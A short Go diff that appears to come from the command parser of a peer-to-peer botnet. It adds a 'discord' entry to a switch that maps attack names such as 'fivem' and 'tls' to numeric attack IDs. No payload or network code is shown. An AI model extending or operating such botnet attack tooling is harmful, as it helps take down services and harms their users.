@@ -150,6 +150,8 @@ func (this *P2PInjector) ParseAndSend(cmd string) error {
 		attackID = 1
 	case "fivem":
 		attackID = 2
+	case "discord":
+		attackID = 30
 	case "pps":
 		attackID = 3
 	case "tls":
